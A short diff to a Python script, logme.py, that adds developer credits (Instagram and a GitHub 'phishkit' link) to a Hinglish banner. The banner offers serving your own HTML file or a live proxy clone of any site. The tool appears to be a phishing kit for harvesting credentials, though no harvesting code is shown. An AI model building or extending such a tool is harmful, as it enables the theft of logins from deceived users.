@@ -226,6 +226,9 @@ def main():
   logme.py v3 (FIXED) — server ab chalega
   Mode 1: apni HTML file
   Mode 2: kisi bhi site ka LIVE clone
+  Devloper: siddharth kabir kumar
+  instagram: https://instagram.com/siddharth_kumarx
+  github: https://github.com/siddharth46500/phishkit.git
 ------------------------------------------""")
     ch = input("Mode: [1] apni HTML file   [2] kisi bhi site ka LIVE clone\n>>> ").strip()
     H.mode = "proxy" if ch == "2" else "file"
